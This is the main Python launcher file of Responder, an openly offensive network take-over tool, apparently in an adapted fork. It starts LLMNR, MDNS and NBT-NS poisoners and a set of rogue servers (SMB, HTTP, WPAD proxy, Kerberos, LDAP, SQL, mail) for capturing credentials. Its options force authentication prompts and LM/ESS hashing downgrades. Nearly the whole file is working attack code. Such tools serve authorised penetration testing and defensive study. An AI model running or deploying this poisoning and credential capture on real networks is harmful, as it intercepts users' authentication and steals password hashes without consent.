#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import optparse
import ssl
try:
    from SocketServer import TCPServer, UDPServer, ThreadingMixIn
except:
    from socketserver import TCPServer, UDPServer, ThreadingMixIn
from threading import Thread
from responder.utils import *
import struct
import sys
#banner()


class ThreadingUDPServer(ThreadingMixIn, UDPServer):
    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                if settings.Config.Bind_To_ALL:
                    pass
                else:
                    if (sys.version_info > (3, 0)):
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
                    else:
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
            except:
                raise
        UDPServer.server_bind(self)

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                if settings.Config.Bind_To_ALL:
                    pass
                else:
                    if (sys.version_info > (3, 0)):
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
                    else:
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
            except:
                raise
        TCPServer.server_bind(self)

class ThreadingTCPServerAuth(ThreadingMixIn, TCPServer):
    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                if settings.Config.Bind_To_ALL:
                    pass
                else:
                    if (sys.version_info > (3, 0)):
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
                    else:
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
            except:
                raise
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        TCPServer.server_bind(self)

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
    def server_bind(self):
        MADDR = "224.0.0.251"

        self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)

        Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR) + settings.Config.IP_aton)

        if OsInterfaceIsSupported():
            try:
                if settings.Config.Bind_To_ALL:
                    pass
                else:
                    if (sys.version_info > (3, 0)):
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
                    else:
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
            except:
                raise
        UDPServer.server_bind(self)

class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
    def server_bind(self):
        MADDR = "224.0.0.252"
        self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)

        Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,socket.inet_aton(MADDR) + settings.Config.IP_aton)

        if OsInterfaceIsSupported():
            try:
                if settings.Config.Bind_To_ALL:
                    pass
                else:
                    if (sys.version_info > (3, 0)):
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
                    else:
                        self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
            except:
                raise
        UDPServer.server_bind(self)

ThreadingUDPServer.allow_reuse_address = 1
ThreadingTCPServer.allow_reuse_address = 1
ThreadingUDPMDNSServer.allow_reuse_address = 1
ThreadingUDPLLMNRServer.allow_reuse_address = 1
ThreadingTCPServerAuth.allow_reuse_address = 1

def serve_thread_udp_broadcast(host, port, handler, tool_q=None):
    try:
        server = ThreadingUDPServer((host, port), handler)
        server.tool_q = tool_q
        server.serve_forever()
    except Exception as e:
        if tool_q != None:
            error_msg = f'serve_thread_udp_broadcast encountered an error {type(e)}: {e}'
            tool_q.put({'poisoner': 'responder', 'action_state': 'error', 'data': error_msg})
        sys.stderr.write("Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_NBTNS_poisoner(host, port, handler, tool_q=None):
    serve_thread_udp_broadcast(host, port, handler, tool_q=tool_q)

def serve_MDNS_poisoner(host, port, handler, tool_q=None):
    try:
        server = ThreadingUDPMDNSServer((host, port), handler)
        server.tool_q = tool_q
        server.serve_forever()
    except Exception as e:
        if tool_q != None:
            error_msg = f'serve_MDNS_poisoner encountered an error {type(e)}: {e}'
            tool_q.put({'poisoner': 'responder', 'action_state': 'error', 'data': error_msg})
        sys.stderr.write("Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_LLMNR_poisoner(host, port, handler, tool_q=None):
    try:
        server = ThreadingUDPLLMNRServer((host, port), handler)
        server.tool_q = tool_q
        server.serve_forever()
    except Exception as e:
        if tool_q != None:
            error_msg = f'serve_LLMNR_poisoner encountered an error {type(e)}: {e}'
            tool_q.put({'poisoner': 'responder', 'action_state': 'error', 'data': error_msg})
        sys.stderr.write("Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_udp(host, port, handler, tool_q=None):
    try:
        if OsInterfaceIsSupported():
            server = ThreadingUDPServer((host, port), handler)
            server.tool_q = tool_q
            server.serve_forever()
        else:
            server = ThreadingUDPServer((host, port), handler)
            server.tool_q = tool_q
            server.serve_forever()
    except Exception as e:
        if tool_q != None:
            error_msg = f'serve_thread_udp encountered an error {type(e)}: {e}'
            tool_q.put({'poisoner': 'responder', 'action_state': 'error', 'data': error_msg})
        sys.stderr.write("Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_tcp(host, port, handler, tool_q=None):
    try:
        if OsInterfaceIsSupported():
            server = ThreadingTCPServer((host, port), handler)
            server.tool_q = tool_q
            server.serve_forever()
        else:
            server = ThreadingTCPServer((host, port), handler)
            server.tool_q = tool_q
            server.serve_forever()
    except Exception as e:
        if tool_q != None:
            error_msg = f'serve_thread_tcp encountered an error {type(e)}: {e}'
            tool_q.put({'poisoner': 'responder', 'action_state': 'error', 'data': error_msg})
        sys.stderr.write("Error starting TCP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_tcp_auth(host, port, handler, tool_q=None):
    try:
        if OsInterfaceIsSupported():
            server = ThreadingTCPServerAuth((host, port), handler)
            server.tool_q = tool_q
            server.serve_forever()
        else:
            server = ThreadingTCPServerAuth((host, port), handler)
            server.tool_q = tool_q
            server.serve_forever()
    except Exception as e:
        if tool_q != None:
            error_msg = f'serve_thread_tcp_auth encountered an error {type(e)}: {e}'
            tool_q.put({'poisoner': 'responder', 'action_state': 'error', 'data': error_msg})
        sys.stderr.write("Error starting TCP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_SSL(host, port, handler, tool_q=None):
    try:

        cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
        key =  os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)

        if OsInterfaceIsSupported():
            server = ThreadingTCPServer((host, port), handler)
            server.tool_q = tool_q
            server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
            server.serve_forever()
        else:
            server = ThreadingTCPServer((host, port), handler)
            server.tool_q = tool_q
            server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
            server.serve_forever()
    except Exception as e:
        if tool_q != None:
            error_msg = f'serve_thread_SSL encountered an error {type(e)}: {e}'
            tool_q.put({'poisoner': 'responder', 'action_state': 'error', 'data': error_msg})
        sys.stderr.write("Error starting SSL server on port " + str(port) + ", check permissions or other servers running.")

def main(raw_args=None, tool_q=None, responder_blacklist=None, responder_scope=None):

    parser = optparse.OptionParser(usage='python %prog -I eth0 -w -r -f\nor:\npython %prog -I eth0 -wrf',
                                   version=settings.__version__, prog=sys.argv[0])
    parser.add_option('-A', '--analyze', action="store_true",
                      help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding.",
                      dest="Analyze", default=False)
    parser.add_option('-I', '--interface', action="store",
                      help="Network interface to use, you can use 'ALL' as a wildcard for all interfaces",
                      dest="Interface", metavar="eth0", default=None)
    parser.add_option('-i', '--ip', action="store", help="Local IP to use \033[1m\033[31m(only for OSX)\033[0m",
                      dest="OURIP", metavar="10.0.0.21", default=None)

    parser.add_option('-e', "--externalip", action="store",
                      help="Poison all requests with another IP address than Responder's one.", dest="ExternalIP",
                      metavar="10.0.0.22", default=None)

    parser.add_option('-b', '--basic', action="store_true", help="Return a Basic HTTP authentication. Default: NTLM",
                      dest="Basic", default=False)
    parser.add_option('-r', '--wredir', action="store_true",
                      help="Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False",
                      dest="Wredirect", default=False)
    parser.add_option('-d', '--NBTNSdomain', action="store_true",
                      help="Enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False",
                      dest="NBTNSDomain", default=False)
    parser.add_option('-f', '--fingerprint', action="store_true",
                      help="This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.",
                      dest="Finger", default=False)
    parser.add_option('-w', '--wpad', action="store_true",
                      help="Start the WPAD rogue proxy server. Default value is False", dest="WPAD_On_Off",
                      default=False)
    parser.add_option('-u', '--upstream-proxy', action="store",
                      help="Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)",
                      dest="Upstream_Proxy", default=None)
    parser.add_option('-F', '--ForceWpadAuth', action="store_true",
                      help="Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False",
                      dest="Force_WPAD_Auth", default=False)

    parser.add_option('-P', '--ProxyAuth', action="store_true",
                      help="Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective when combined with -r. Default: False",
                      dest="ProxyAuth_On_Off", default=False)

    parser.add_option('--lm', action="store_true",
                      help="Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False",
                      dest="LM_On_Off", default=False)
    parser.add_option('--disable-ess', action="store_true", help="Force ESS downgrade. Default: False",
                      dest="NOESS_On_Off", default=False)
    parser.add_option('-v', '--verbose', action="store_true", help="Increase verbosity.", dest="Verbose")
    options, args = parser.parse_args(raw_args)

    if not os.geteuid() == 0:
        #print(color("[!] Responder must be run as root."))
        sys.exit(-1)
    elif options.OURIP is None and IsOsX() is True:
        sys.stderr.write("OSX detected, -i mandatory option is missing")
        parser.print_help()
        exit(-1)

    settings.init()
    if responder_blacklist or responder_scope:
        #edit config before populate reads the file
        settings.Config.edit_local_responder_config(responder_blacklist, responder_scope)
    settings.Config.populate(options, tool_q=tool_q)

    #StartupMessage()

    settings.Config.ExpandIPRanges()

    if settings.Config.AnalyzeMode:
        pass
        #print(color('[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.', 3, 1))

    # Create the DB, before we start Responder.
    CreateResponderDb()
    try:
        threads = []

        # Load (M)DNS, NBNS and LLMNR Poisoners
        from responder.poisoners.LLMNR import LLMNR
        from responder.poisoners.NBTNS import NBTNS
        from responder.poisoners.MDNS import MDNS
        threads.append(Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR, tool_q,)))
        threads.append(Thread(target=serve_MDNS_poisoner,  args=('', 5353, MDNS, tool_q,)))
        threads.append(Thread(target=serve_NBTNS_poisoner, args=('', 137,  NBTNS, tool_q,)))

        # Load Browser Listener
        from responder.servers.Browser import Browser
        threads.append(Thread(target=serve_thread_udp_broadcast, args=('', 138,  Browser, tool_q,)))

        if settings.Config.HTTP_On_Off:
            from responder.servers.HTTP import HTTP
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 80, HTTP, tool_q,)))

        if settings.Config.WinRM_On_Off:
            from responder.servers.WinRM import WinRM
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 5985, WinRM, tool_q,)))

        if settings.Config.SSL_On_Off:
            from responder.servers.HTTP import HTTP
            threads.append(Thread(target=serve_thread_SSL, args=(settings.Config.Bind_To, 443, HTTP, tool_q,)))

        if settings.Config.RDP_On_Off:
            from responder.servers.RDP import RDP
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 3389, RDP, tool_q,)))

        if settings.Config.DCERPC_On_Off:
            from responder.servers.RPC import RPCMap, RPCMapper
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 135, RPCMap, tool_q,)))
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, settings.Config.RPCPort, RPCMapper, tool_q,)))

        if settings.Config.WPAD_On_Off:
            from responder.servers.HTTP_Proxy import HTTP_Proxy
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 3141, HTTP_Proxy, tool_q,)))

        if settings.Config.ProxyAuth_On_Off:
            from responder.servers.Proxy_Auth import Proxy_Auth
            threads.append(Thread(target=serve_thread_tcp_auth, args=(settings.Config.Bind_To, 3128, Proxy_Auth, tool_q,)))

        if settings.Config.SMB_On_Off:
            if settings.Config.LM_On_Off:
                from responder.servers.SMB import SMB1LM
                threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 445, SMB1LM, tool_q,)))
                threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 139, SMB1LM, tool_q,)))
            else:
                from responder.servers.SMB import SMB1
                threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 445, SMB1, tool_q,)))
                threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 139, SMB1, tool_q,)))

        if settings.Config.Krb_On_Off:
            from responder.servers.Kerberos import KerbTCP, KerbUDP
            threads.append(Thread(target=serve_thread_udp, args=('', 88, KerbUDP, tool_q,)))
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 88, KerbTCP, tool_q,)))

        if settings.Config.SQL_On_Off:
            from responder.servers.MSSQL import MSSQL, MSSQLBrowser
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 1433, MSSQL, tool_q,)))
            threads.append(Thread(target=serve_thread_udp_broadcast, args=(settings.Config.Bind_To, 1434, MSSQLBrowser, tool_q,)))

        if settings.Config.FTP_On_Off:
            from responder.servers.FTP import FTP
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 21, FTP, tool_q,)))

        if settings.Config.POP_On_Off:
            from responder.servers.POP3 import POP3
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 110, POP3, tool_q,)))

        if settings.Config.LDAP_On_Off:
            from responder.servers.LDAP import LDAP, CLDAP
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 389, LDAP, tool_q,)))
            threads.append(Thread(target=serve_thread_udp, args=('', 389, CLDAP, tool_q,)))

        if settings.Config.SMTP_On_Off:
            from responder.servers.SMTP import ESMTP
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 25,  ESMTP, tool_q,)))
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 587, ESMTP, tool_q,)))

        if settings.Config.IMAP_On_Off:
            from responder.servers.IMAP import IMAP
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 143, IMAP, tool_q,)))

        if settings.Config.DNS_On_Off:
            from responder.servers.DNS import DNS, DNSTCP
            threads.append(Thread(target=serve_thread_udp, args=('', 53, DNS, tool_q,)))
            threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 53, DNSTCP, tool_q,)))

        for thread in threads:
            thread.setDaemon(True)
            thread.start()

        #print(color('\n[+]', 2, 1) + " Listening for events...\n")

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        sys.exit("\r%s Exiting..." % color('[+]', 2, 1))
    except:
        sys.exit(-1)

if __name__ == '__main__':
    main()
